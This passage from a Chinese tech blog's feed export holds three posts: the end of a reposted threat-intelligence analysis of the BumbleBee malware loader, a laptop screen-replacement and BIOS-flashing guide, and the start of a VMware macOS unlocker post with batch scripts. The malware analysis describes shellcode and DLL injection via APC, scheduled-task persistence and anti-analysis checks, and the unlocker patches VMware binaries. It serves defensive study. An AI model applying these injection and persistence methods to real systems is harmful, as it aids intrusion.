src="https://s1.ax1x.com/2022/08/20/vsLoLV.png" alt="指向BumbleBee的表单攻击链"></p><p>Proofpoint 将此活动归因于 TA578，这是 Proofpoint 研究人员自 2020 年 5 月以来一直在跟踪的威胁行为者。TA578 此前曾在基于电子邮件的活动中监测到，这些活动提供 Ursnif、IcedID、KPOT Stealer、Buer Loader、BazaLoader 和 Cobalt Strike。</p><h2 id="与其他恶意软件的关系">与其他恶意软件的关系</h2><p>​多个威胁参与者正在使用BumbleBee，将其引入环境的时间及本报告中描述的行为可以被认为是网络犯罪威胁领域的转折点。此外，Proofpoint以适度的信心评估使用BumbleBee的攻击者可能被视为初始访问促进，即，渗透主要目标然后向后续勒索软件行为者出售访问权的独立网络犯罪组织。</p><p>​至少三个被跟踪的通常传播 BazaLoader 恶意软件的威胁行为者已经过渡到 Bumblebee 有效载荷，BazaLoader 最后一次出现在 Proofpoint 数据中是在 2022 年 2 月。</p><p>​BazaLoader 是 2020 年首次发现的第一阶段下载器，与包括 <a href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/">Conti</a> 在内的后续勒索软件活动有关。  Proofpoint 研究人员最初监测到 BazaLoader 由主要有传播 Trick 银行木马的威胁行为者大量传播。</p><p><img src="https://s3.bmp.ovh/imgs/2022/08/20/92a5d907766d31d2.png" alt="BazaLoader 和 Bumblebee 精选活动的时间表"></p><p>​BazaLoader 从网络犯罪威胁领域的明显消失恰逢 Conti Leaks 发生的时间，2022 年 2 月末，一名有权访问 Conti 内部操作的乌克兰研究人员开始从网络犯罪组织泄露数据。  在泄露的文件中发现了与 BazaLoader 相关的基础设施。</p><h2 id="恶意软件分析">恶意软件分析</h2><p>BumbleBee 是一款用C++写的下载器。分析的初始BumBleBee DLL样本包含两个导出，一个是直接启动 Bumblebee 主函数的线程，另一个最终导致相同的主函数，但添加了检查钩子是否已放置在关键动态链接库 (DLL) 中，加载此 DLL 的 LNK 会跳过默认的 DllMain 函数，而是调用检查函数挂钩的导出。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLHdU.png" alt="BumBleBee hook检查"></p><p>和大多数恶意软件不同，BumBleBee加载器的大部分内容都被压缩为一个方法函数，后面的初始化、请求发送和响应处理都被分解为不同的函数。该加载器首先复制有效作用僵尸网络标识符的GroupID，于大多数恶意软件不同，BumBleBee 目前以明文形式存储其配置，但在未来可能会增加混淆功能。复制GroupID后，加载器会解析各种NTDLL函数的地址，使其能够加载过程之后能正常执行注入。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsL7ZT.png" alt="复制和设置GroupID"></p><p>一旦解析函数，就会创建一个独特的事件，该事件作用互斥以确保只有一个加载器示例正在运行。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLboF.png" alt="创建事件"></p><p>此时，确认单个 Bumblebee 实例正在运行，恶意软件开始收集系统信息。  以下 WMI 查询通过 COM 对象执行以收集通信所需的详细信息：</p><ul><li>SELECT * FROM Win32_ComputerSystem</li><li>SELECT * FROM Win32_ComputerSystemProduct</li></ul><p>根据查询输出收集和连接系统的主机名和UUID，然后生成此值的MD5哈希并将其转换为十六进制的结果作为机器的唯一客户端ID。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLOJJ.png" alt="创建客户端ID"></p><p>生成客户端ID后，加载器创建系统版本字符串，其中包括WMI查询的标题、主机的用户名和主机的域。</p><p>收集到所有这些信息后，加载器开始与 C2 通信，加载器每 25 秒检查一次 C2 以接收命令。和大多数具有立即返回给客户端的模块或有效负载的恶意软件不同，该恶意软件背后的攻击者似乎手动将有效负载部署到Bumblebee，因为它可能需要几个小时才能收到任何要执行的作业。每个服务器响应都包含下图中显示的数据的变体。如果返回有效任务，“tasks”值将是包含所有任务信息的字典列表。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLXW9.png" alt="Bumblebee 响应内容"></p><p><em>Bumblebee</em> 加载器支持以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">Shi：shellcode 注入<br>Dij：DLL注入<br>Dex：下载执行文件<br>Sdl：卸载加载器<br>Ins：在目标上开启权限维持<br></code></pre></td></tr></table></figure><h3 id="Ins-命令">Ins 命令</h3><p>Ins 命令通过将 Bumblebee DLL 复制到 <code>%APPDATA%</code> 文件夹的子目录并创建将加载 DLL 的 VBS 脚本来启用权限维持，然后创建计划任务，通过 wscript.exe 调用 VBS 脚本。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLjzR.png" alt="通过VBS加载DLL"></p><p><img src="https://s1.ax1x.com/2022/08/20/vsLxQ1.png" alt="使用VBS创建计划任务"></p><h3 id="Dex-命令">Dex 命令</h3><p>Dex 命令是支持的命令中最基本命令，该命令从服务器响应中获取 base64 解码的内容，以硬编码路径将其写入磁盘并通过 COM 对象执行。</p><p><img src="https://s3.bmp.ovh/imgs/2022/08/20/895554bb6f668058.png" alt="Dex命令输出"></p><h3 id="Dij-命令">Dij 命令</h3><p>Dij 命令增加了将 DLL 注入其他进程内存的能力，对于注入目标，恶意软件会选择三个硬编码选项之一来将 DLL 注入到ImagingDevices.exe、wab.exe 或 wabmig.exe。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLzsx.png" alt="将可执行文件识别为注入目标"></p><p>选择一个随机可执行文件后，加载器会以挂起状态启动进程，使得恶意软件可以轻松操作该过程而不被发现。接下来，它通过启用调试权限来准备进程注入，以便注入执行所需的shellcode。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOSL6.png" alt="创建新进程和启用调试权限"></p><p>设置适当的权限后，可以操作数据，加载器将shellcode写入挂起的进程，用新的入口点覆盖初始入口点，这个入口点实现写入32字节的shellcode，并将占位符替换为SleepEx的解析地址功能。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsO9eK.png" alt="SleepEx替换占位符数值"></p><p>如下图所示，shellcode 程序集中的 <code>call RAX</code> 指令被替换为 SleepEx 的地址，延迟1000毫秒，shellcode 调用 SleepEx ，然后将 shellcode 注入到进程中，进程恢复。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOCdO.png" alt="反汇编后的shellcode"></p><p>加载器通过 APC 例程将恶意负载注入到可执行文件中。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOPoD.png" alt="通过APCj进行进程注入"></p><p>为了成功并正确的注入，加载器在注入目标中创建两个新部分，并将缓冲区从 dij 复制到新的内存空间，然后通过动态解析的 <code>NtQueueApcThread</code> 调用目标可执行文件中复制的内容。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOFFe.png" alt="创建两个内存空间"></p><p><img src="https://s1.ax1x.com/2022/08/20/vsOkJH.png" alt="调用动态解析的 NtQueueApcThread"></p><h3 id="恶意软件开发">恶意软件开发</h3><p>Proofpoint 研究人员监测到，在一月份的活动中，BumbleBee 开发人员为恶意软件添加了新功能，具体来说，包括反虚拟机和反沙盒检查。以下是较早的示例：</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOAWd.png" alt="旧版BumBleBee样本"></p><p>最新样本，更新了 BumbleBee 示例，添加了 check_bad_artifacts。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOVSA.png" alt="最新BumBleBee样本"></p><p>通过研究新功能，我们发现了一个新的方法：</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOZQI.png" alt="反编译恶意软件的框架检查"></p><p>下图是 Al Khaser 工具的一部分，该工具是用于检查 VM 工件的常用工具，Bumblebee 加载器的开发人员似乎依赖开源工具，就像标准开发人员一样。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOmOP.png" alt="来自 Al Khaser 的开源代码显示完全相同的检查"></p><h2 id="重大更新">重大更新</h2><p>Proofpoint 表示，在2022年4月19 日观察到的最新版本 BumbleBee 中，BumbleBee 功能发生了重大变化，现在支持通过逗号分隔列表支持多个 C2。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOeyt.png" alt="多个嵌入式C2"></p><p>旧版中硬编码设置了睡眠时间 25秒，在新版本中已经改为了随机。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsOuef.png" alt="随机sleep"></p><p>该恶意软件最明显的变化是在网络通信中增加了一个加密层，开发人员通过RC4硬编码密钥添加到样本中，用于加密请求和解密响应。</p><p><img src="https://s3.bmp.ovh/imgs/2022/08/20/67da4f2856ce534f.png" alt="加密请求内容"></p><p><img src="https://s3.bmp.ovh/imgs/2022/08/20/014ade3c194d2c5b.png" alt="解密响应内容"></p><p>作为该组织的另一个标志，展示了他们快速的开发速度，4月22日，Proofpoint 监测到该组织向 BumbleBee 添加了一个新线程，该线程根据恶意软件分析师使用的常用工具的硬编码列表来检查当前正在运行的进程，该线程在 BumbleBee 进程开始时创建。</p><p><img src="https://s3.bmp.ovh/imgs/2022/08/20/528dc025cc56c9c2.png" alt="Bumblebee 主函数显示新线程的开始"></p><p>如果找到这些进程中的任何一个，该函数将返回 1，这会触发 BumbleBee 主线程终止。</p><p><img src="https://s1.ax1x.com/2023/05/07/p9dNFeA.png" alt="BumBleBee检查工具列表"></p><h2 id="结论">结论</h2><p>Bumblebee 是一个复杂的恶意软件加载程序，它展示了持续开发的证据， 它被多个网络犯罪威胁攻击者使用。  Proofpoint 高度自信地评估 BumbleBee 加载器可用作初始访问促进者，以提供后续有效负载，例如勒索软件。  根据它在威胁环境中出现的时间以及被多个网络犯罪团伙使用的时间，BumbleBee 很可能是BazaLoader 的直接替代品，那么它是一种新的多功能工具，由历史上偏爱其他恶意软件的行为者使用。</p><h3 id="通信样本">通信样本</h3><table><thead><tr><th>样本</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>c6ef53740f2011825dd531fc65d6eba92f87d0ed1b30207a9694c0218c10d6e0</td><td>SHA256</td><td>2022年3月31日至4月1日ISO 样本</td></tr><tr><td>a72538ba00dc95190d6919756ffce74f0b3cf60db387c6c9281a0dc892ded802</td><td>SHA256</td><td>2022年3月31日至4月1日样本</td></tr><tr><td>77f6cdf03ba70367c93ac194604175e2bd1239a29bc66da50b5754b7adbe8ae4</td><td>SHA256</td><td>2022年4月5日ISO样本</td></tr><tr><td>0faa970001791cb0013416177cefebb25fbff543859bd81536a3096ee8e79127</td><td>SHA256</td><td>2022年4月5日Bumblebee 样本</td></tr><tr><td>Fe7a64dad14fe240aa026e57615fc3a22a7f5ba1dd55d675b1d2072f6262a1</td><td>SHA256</td><td>2022年3月28日至4月1日ISO样本</td></tr><tr><td>08CD6983F183EF65EABD073C01F137A913282504E2502AC34A1BE3E599AC386B</td><td>SHA256</td><td>3月10日未混淆的Bumblebee 样本</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>转载搬运</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>炫龙毁灭者DD2换屏&amp;更新BIOS过程</title>
    <link href="/posts/843d207e.html"/>
    <url>/posts/843d207e.html</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3><p>​机器于18年在某平台购买，用了四年的机子突然某天屏幕不亮，接外屏是正常的。用强光手电照屏幕发现是有图像，那八成是屏幕灯管老化损坏了，才导致的无背光现象。拿去单纯修背光的话，不值得。而且原来的屏幕45%NTSC的色域，很low屏幕还泛黄，索性在某宝上买个好点的屏幕自己换上就好了。</p><p>屏幕规格：【京东方NY0  144Hz ，100SRGB色域，72NTSC，IPS A+屏，40针屏线】，实际收到的确是165Hz的屏。</p><p>然后存在两个“问题”，一是卖家配的40针屏线比原来的线短了一节，二是换上新屏后开机Logo页面和BIOS界面显示不全(升级BIOS版本可以解决)。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT3MnA.png" alt="新旧屏线"></p><h3 id="0x02-拆机">0x02 拆机</h3><p>​主要注意的就是需要拆掉键盘后，要卸掉6个螺丝才能拆下整个D面。换屏线前最好是把B壳拆掉旧屏幕拿出来，其他的没什么好说的，有手就行。可以参考：<a href="https://v.qq.com/x/page/v0702wv90md.html">小秋搞机炫龙毁灭者DD2 DC2 NB50TK1拆机视频</a></p><p><img src="https://s1.ax1x.com/2022/09/04/vT3Y9S.png" alt="拆开整个D壳后"></p><h3 id="0x03-换屏线">0x03 换屏线</h3><p>​拆下旧屏线换上新的屏线，果然短了一截，按照原来的布局走线，由于线短了一节，就算把屏线拉直屏幕四个螺丝孔依旧对不上，没法安装。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT3uXd.png" alt="屏线"></p><p>让卖家重新发一条屏线？时间久太麻烦了，按下图改一下走线就可以了。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT3NcQ.png" alt="屏线走线"></p><p>按新布局走线后确实可以正常装上屏幕，也点亮开机了。但是 开机Logo页面和BIOS界面显示不全。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT3Q0I.png" alt="偏离中心的开机logo"></p><p><img src="https://s1.ax1x.com/2022/09/04/vT3l7t.png" alt="BIOS界面显示不全"></p><p>后面爬了许多贴子才得知，大概率是笔记本当前的BIOS版本太低了，无法自适应调节高刷屏，需要升级BIOS。</p><h3 id="0x04-更新BIOS和EC">0x04 更新BIOS和EC</h3><p>​属于蓝天模具的DD2并没有像主流主板厂商提供一键更新BIOS的软件或者是BIOS内更新选项，所以更新BIOS是略带危险而又有点复杂的事情，稍有不慎笔记本电脑就成砖了。</p><p>首先到 <a href="https://repo.palkeo.com/clevo-mirror/NB5TK1_TJ1/">Clevo mirror网站</a> 下载适用DD2的 最新版BIOS和EC固件，用户名和密码都是 repo</p><p>下载后解压，先升级EC才能升级BIOS，升级操作前最好是进BIOS界面把安全启动关掉(security boot)。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT33AP.png" alt="EC固件"></p><p>升级EC需要用到 <code>ECWinFlash</code>，下载地址：<a href="https://wwp.lanzouy.com/b02dmqdqd">https://wwp.lanzouy.com/b02dmqdqd</a> 密码:1x0b</p><p>打开ECWinFlash 会弹出出几个警告，一直确定下一步就好了。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT38tf.png" alt="ECWinFlash"></p><p>软件左侧为是当前的EC版本信息。点击右上角三个点选择下载的新EC固件，然后点击左侧的Flash按钮，就会自动刷写，刷写过程中最好不要操作。右侧小窗口有进度信息，刷完后会自动关机。在关机后拔掉AC电源线并且把笔记本电池也拆掉，等待约15秒后重新装回电池插上电源开机，连续按F2，无意外的话进入BIOS界面，就可以看到EC版本已经更新。</p><p>下一步更新BIOS，以管理员身份打开CMD，转到BIOS固件目录下，执行 <code>WMeset.exe</code>会自动重启电脑，用于解锁BIOS写入保护功能，同时风扇会最大转速旋转。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT3Gh8.png" alt="解锁BIOS写入保护功能"></p><p>重启后再次以管理员身份打开cmd 切换到BIOS固件目录下手动执行 <code>FPTW64.exe -f NB50TJ1.BIN -bios</code> 或者<code>FlashMEWinX64.bat</code> 开始刷入BIOS。其中可能会提示BIOS大小不一致，是否确定要刷入，根据提示输入确定即可。</p><p><img src="https://s1.ax1x.com/2022/09/04/vT3t1g.png" alt="刷入BIOS"></p><p>刷写完BIOS手动关机，拔掉电源线，拆掉电池等待15秒左右，然后重新开机，会进入1分钟左右黑屏状态，待到屏幕上出现蓝色提示框（也有可能只是闪一下屏）说明已经完成了BIOS刷写，按两三下回车键电脑就会进入BIOS界面，重新把安全启动开启，保存并重启开机就好了。</p><p>Reference</p><p><a href="https://tieba.baidu.com/p/6048985832">https://tieba.baidu.com/p/6048985832</a><br><a href="https://v.qq.com/x/page/v0702wv90md.html">https://v.qq.com/x/page/v0702wv90md.html</a><br><a href="https://www.bilibili.com/read/cv6145892/">https://www.bilibili.com/read/cv6145892/</a><br><a href="https://www.cnblog.com/feiquan/">https://www.cnblog.com/feiquan/</a><br><a href="https://www.cnblogs.com/feiquan/p/10225301.html">https://www.cnblogs.com/feiquan/p/10225301.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VMware Workstation 16 解锁安装 macOS</title>
    <link href="/posts/b48cad46.html"/>
    <url>/posts/b48cad46.html</url>
    
    <content type="html"><![CDATA[<p>适用 VMware Workstation 11-16、 Player 7-16，理论上 Windows/Linux/Mac都可用。</p><p>以下只对Windows下的VMware做了修改，Linux和Mac自测。</p><p>win-install.cmd</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">@echo off<br>setlocal ENABLEEXTENSIONS<br>echo.<br>echo Unlocker <span class="hljs-number">3.0</span><span class="hljs-number">.2</span> <span class="hljs-keyword">for</span> VMware Workstation<br>echo =====================================<br>echo (c) Dave Parsons <span class="hljs-number">2011</span><span class="hljs-number">-18</span><br>echo.<br>echo [+] <span class="hljs-keyword">Set</span> encoding parameters...<br><br><br>echo.<br><span class="hljs-keyword">set</span> KeyName=<span class="hljs-string">&quot;HKLM\SOFTWARE\Wow6432Node\VMware, Inc.\VMware Player&quot;</span><br>:: delims <span class="hljs-keyword">is</span> a TAB followed by a space<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=2* delims= &quot;</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-comment">&#x27;REG QUERY %KeyName% /v InstallPath&#x27;) do set InstallPath=%%B</span><br>echo [*] VMware <span class="hljs-keyword">is</span> installed at: %InstallPath%<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=2* delims= &quot;</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-comment">&#x27;REG QUERY %KeyName% /v ProductVersion&#x27;) do set ProductVersion=%%B</span><br>echo [*] VMware product version: %ProductVersion%<br><br>pushd %~dp0<br><br>echo.<br>echo [*] Stopping VMware services...<br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMwareHostd&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMAuthdService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMnetDHCP&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMUSBArbService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMware NAT Service&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>taskkill /F /IM vmware-tray.exe &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br>echo.<br>echo [*] Backing up files...<br>rd /s /q .\backup &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>mkdir .\backup<br>mkdir .\backup\x64<br>xcopy /F /Y <span class="hljs-string">&quot;%InstallPath%x64\vmware-vmx.exe&quot;</span> .\backup\x64<br>xcopy /F /Y <span class="hljs-string">&quot;%InstallPath%x64\vmware-vmx-debug.exe&quot;</span> .\backup\x64<br>xcopy /F /Y <span class="hljs-string">&quot;%InstallPath%x64\vmware-vmx-stats.exe&quot;</span> .\backup\x64<br>xcopy /F /Y <span class="hljs-string">&quot;%InstallPath%vmwarebase.dll&quot;</span> .\backup\<br><br>echo.<br>echo [*] Patching...<br>python.exe .\unlocker.py<br><br>echo.<br>echo [*] Extracting VMware Tools...<br>python extrtools.py<br>xcopy /F /Y .\tools\darwin*.* <span class="hljs-string">&quot;%InstallPath%&quot;</span><br><br>echo.<br>echo [*] Starting VMware services...<br>net start <span class="hljs-string">&quot;VMware NAT Service&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMnetDHCP&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMAuthdService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMUSBArbService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMwareHostd&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br>popd<br>echo.<br>echo [+] Finished!<br>pause<br><br></code></pre></td></tr></table></figure><p>win-uninstall.cmd</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">@echo off<br>setlocal ENABLEEXTENSIONS<br>echo.<br>echo Unlocker <span class="hljs-number">3.0</span><span class="hljs-number">.2</span> <span class="hljs-keyword">for</span> VMware Workstation<br>echo =====================================<br>echo (c) Dave Parsons <span class="hljs-number">2011</span><span class="hljs-number">-18</span><br><br><br>echo.<br><span class="hljs-keyword">set</span> KeyName=<span class="hljs-string">&quot;HKLM\SOFTWARE\Wow6432Node\VMware, Inc.\VMware Player&quot;</span><br>:: delims <span class="hljs-keyword">is</span> a TAB followed by a space<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=2* delims= &quot;</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-comment">&#x27;REG QUERY %KeyName% /v InstallPath&#x27;) do set InstallPath=%%B</span><br>echo [*] VMware <span class="hljs-keyword">is</span> installed at: %InstallPath%<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=2* delims= &quot;</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-comment">&#x27;REG QUERY %KeyName% /v ProductVersion&#x27;) do set ProductVersion=%%B</span><br>echo [*] VMware product version: %ProductVersion%<br><br>pushd %~dp0<br><br>echo.<br>echo [*] Stopping VMware services...<br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMwareHostd&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMAuthdService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMnetDHCP&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMUSBArbService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net <span class="hljs-keyword">stop</span> <span class="hljs-string">&quot;VMware NAT Service&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>taskkill /F /IM vmware-tray.exe &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br>echo.<br>echo [*] Restoring files...<br>xcopy /F /Y .\backup\x64\*.* <span class="hljs-string">&quot;%InstallPath%x64\&quot;</span><br>xcopy /F /Y .\backup\*.* <span class="hljs-string">&quot;%InstallPath%&quot;</span><br>del /f <span class="hljs-string">&quot;%InstallPath%&quot;</span>darwin*.*<br><br>echo.<br>echo [*] Removing backup files...<br>rd /s /q .\backup &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br>echo.<br>echo [*] Starting VMware services...<br>net start <span class="hljs-string">&quot;VMware NAT Service&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMnetDHCP&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMAuthdService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMUSBArbService&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>net start <span class="hljs-string">&quot;VMwareHostd&quot;</span> &gt; NUL <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br>popd<br>echo.<br>echo [+] Finished!<br>pause<br><br><br></code></pre></td></tr></table></figure><p><a href="http://unlocker.py">unlocker.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 